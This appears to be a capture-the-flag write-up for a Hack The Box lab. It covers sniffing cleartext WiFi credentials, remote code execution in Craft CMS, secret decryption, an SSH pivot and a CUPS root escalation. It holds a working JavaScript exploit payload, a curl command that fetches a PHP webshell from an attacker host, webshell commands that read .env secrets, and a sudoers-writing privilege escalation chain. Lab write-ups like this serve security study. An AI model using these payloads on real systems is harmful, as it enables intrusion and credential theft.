***Phase 1: Initial Access — RDP Jumpbox***
Nmap scan revealed the standard HTB port set:

![nmap](/writeups/images/layover1.png)
```bash
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
```
RDP was accessible with weak credentials:

xfreerdp /v:10.129.211.233 /u:contractor /p:'***' /cert:ignore /dynamic-resolution
This landed us on airside-ws01 as the contractor user.***

![xfree](/writeups/images/layover2.png)


Privilege Escalation on the Jumpbox
contractor had unrestricted sudo:


![dis](/writeups/images/layover3.png)

```bash
sudo -l
```
# User contractor may run the following commands on airside-ws01:
#     (ALL : ALL) ALL
Instant root:
![sudo](/writeups/images/layover4.png)
sudo su -
Network Interface Enumeration
Two simulated wireless interfaces appeared:

iw dev
# phy#2: wlan2 (managed)
# phy#3: wlan3 (managed)

![ney](/writeups/images/layover5.png)
These are backed by the kernel’s mac80211_hwsim module — software-simulated radios used for wireless testing.

A scan revealed one open SSID:

nmcli device wifi list
# SSID: HTB International WiFi   SECURITY: --
No encryption at all (key_mgmt=NONE).

![iw](/writeups/images/layover6.png)

### Phase 2: Passive Wireless Sniffing
NetworkManager was intentionally masked, so we managed the interfaces manually.

![connect](/writeups/images/layover7.png)

Connect wlan2 as a Client
ip link set wlan2 up
iw dev wlan2 connect "HTB International WiFi"
sleep 5
iw dev wlan2 link
```bash
# Connected to 02:00:00:00:00:00
Put wlan3 into Monitor Mode
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
Capture the Plaintext Login
```
The Miles portal used HTTP, not HTTPS. A simulated client (10.13.37.132) logged in on a timer.

![200](/writeups/images/layover8.png)

tshark -i wlan3 -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.request.uri -e http.file_data
Within minutes, the POST body appeared in cleartext:

10.13.37.132  /miles/login.php  username=jenny&password=***
Credentials captured: jenny:***

The root cause: open WiFi plus HTTP — no encryption at either layer.

### Phase 3: Web Foothold — Craft CMS 5.9.8
The portal resolved to 10.13.37.10:

![web](/writeups/images/layover9.png)

getent hosts portal.international.htb
# 10.13.37.10  portal.international.htb
The admin panel at http://portal.international.htb/admin accepted jenny‘s credentials.

![admin](/writeups/images/layover10.png)

System report confirmed:

![decrypt](/writeups/images/layover11.png)

Craft CMS Solo 5.9.8
Yii 2.0.54
PHP 8.3.6
Imagick 3.7.0 (ImageMagick 6.9.12-98)
Custom module: modules\htbairways\Module
The target was vulnerable to CVE-2026-28695 (Yii2 behavior injection) — a patch bypass where the fix restricted the vulnerable path to admins, but a lower-privileged endpoint (element-search) still reached the same sink.

### Phase 4: Craft CMS RCE
The exploit injects a Yii2 behavior into the element-search endpoint. The behavior’s constructor receives attributeTypes pointing at Psy\Readline\Hoa\ConsoleProcessus::execute and typecastBeforeSave holding our command.

The Payload
```bash
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
      condition: { class: "craft\\elements\\conditions\\ElementCondition",
        elementType: "craft\\elements\\Category",
        fieldLayouts: [ { "as rce": {
          "__class": "yii\\behaviors\\AttributeTypecastBehavior",
          "__construct()": [ {
            attributeTypes: {
              typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]
            },
            typecastBeforeSave: cmd
          } ] }, "on *": "self::beforeSave" } ] } };
    const url='/index.php?p=admin/actions/element-search/search';
    return fetch(url,{method:'POST',headers:{
      'Content-Type':'application/json',
      'Accept':'application/json',
      'X-CSRF-Token':csrf
    },body:JSON.stringify(b)});
  };
  await fire("curl http://10.13.37.131:8000/shell.php --output /var/www/portal/web/index.php");
})()
```

![code](/writeups/images/layover12.png)


Critical detail: typecastBeforeSave is a sibling of attributeTypes, not nested inside it. That structure is what actually executes the command.

The escapeshellcmd Constraint
The sink runs through escapeshellcmd(), blocking pipes, redirects, and command substitution. The surviving primitive is a single binary with arguments:

curl http://ATTACKER:8000/shell.php --output /var/www/portal/web/index.php
This overwrote the site’s index.php with a PHP webshell.

Webshell Access
curl "http://portal.international.htb/index.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
RCE confirmed as www-data.

Note: The callback IP must be airside-ws01‘s wlan2 address (e.g. 10.13.37.131) — not Kali’s VPN IP. The CMS server sits on the internal 10.13.37.0/24 network with no route back to the HTB VPN. Only the jumpbox bridges both.

Phase 5: Secrets Extraction
With a webshell, the .env file was trivially readable:

curl "http://portal.international.htb/index.php?cmd=cat+/var/www/portal/.env"
Contents:

CRAFT_SECURITY_KEY=***
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=***
Database Dump
mysql -h127.0.0.1 -ucraftuser -p*** craft -e "SELECT * FROM htbairways_settings;"
Output:

id  name                value
1   mailRelayPassword   u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFk...(truncated)
2   mailRelayHost       mail.htbairways.htb
3   mailRelayPort       587
4   mailRelayUser       aporter
Phase 6: Decrypting the Mail Relay Password
Craft uses Yii’s Security::decryptByKey() with AES-256-CBC + HMAC. The security key and the encrypted blob were on the same host, so decryption was straightforward.

php -r '
  require "/var/www/portal/vendor/autoload.php";
  $s = new yii\base\Security();
  $key = "***";
  $blob = "u0E7OgbBeWhhPn1HajsFMDg0...";
  echo $s->decryptByKey(base64_decode($blob), $key), "\n";
'
Output:

***
aporter:*** — valid SSH credentials for the CMS server.

Phase 7: SSH Pivot and User Flag
From airside-ws01:

ssh aporter@10.13.37.10
# password: ***
aporter@portal:~$ cat user.txt
4*******************************8
Phase 8: Root via CUPS (CVE-2026-34990)
CUPS version: 2.4.16 (confirmed via cups-config --version)

Listening on: 127.0.0.1:631 (confirmed via ss -tlnp)

Root Cause
When cupsd receives a 401 Unauthorized from an upstream IPP service, it authenticates back using an Authorization: Local <token> header — its own admin token. A rogue IPP server on localhost can trigger that exchange and capture the token, granting admin control of the real CUPS daemon.

Exploit Chain
Stand up a rogue IPP server on 127.0.0.1:9189
Trigger cupsd to authenticate back → capture the Authorization: Local token
Use the token to create a printer with device-uri=file:///etc/sudoers.d/aporter and printer-is-temporary=false
Submit a print job whose content is aporter ALL=(ALL) NOPASSWD: ALL
cupsd (running as root) writes the content to disk
sudo -n bash → root
Token Capture
[*] Starting token capture server...
[+] Captured Local token: CAC54B2CD9DA860CAEF7CF9D65B5EFCB
The exploit is race-dependent. Several attempts were needed. The winning variant:

Removed unnecessary OP_CUPS_ACCEPT_JOBS / OP_RESUME_PRINTER calls
Increased loop iterations to 1000+
Reduced sleep to 0.01s
Root
[*] Creating file:// printer...
[+] Vulnerable!
[+] File created: /etc/sudoers.d/aporter
[+] Owner: 0:0
[+] Contents:
aporter ALL=(ALL) NOPASSWD: ALL
sudo su
root@portal:/tmp# cat /root/root.txt
f**8a6c***************b37*****6
Key Takeaways
Open WiFi + HTTP is still a real threat model. No layer-2 or layer-7 encryption means anyone in range can read credentials. This isn’t legacy — it’s ongoing anywhere open networks are deployed.
Monitor mode ≠ promiscuous mode. Know the difference when building a sniffing setup.
A constrained RCE is still an RCE. When escapeshellcmd() blocks pipes and chaining, a single curl --data-binary @file or curl URL --output path call turns blind command execution into a reliable primitive.
Callbacks must use a routable IP. The CMS server can only reach the jumpbox’s wireless address — not the attacker’s VPN IP. Debugging this cost hours.
Decrypt with the target’s own code, not a reimplementation. Calling yii\base\Security::decryptByKey() directly avoids AES padding and key-derivation mistakes.
Custom application modules are where secrets hide. modules/htbairways/ held the canonical clue — the security key and encrypted blob were on the same host.
Background daemons running as root are a privesc goldmine. CUPS speaks a network protocol, runs as root, and leaks an admin token via localhost auth coercion.
Tools Used
nmap · xfreerdp · iw · tshark · curl · mysql · php · ssh · python3 · gzip · ipptool

References
Craft CMS docs: craftcms.com/docs/5.x/configure.html
Yii2 Security class: yiiframework.com/doc/api/2.0/yii-base-security
CVE-2026-28695 — Craft CMS patch bypass RCE
CVE-2026-34990 — CUPS local privilege escalation
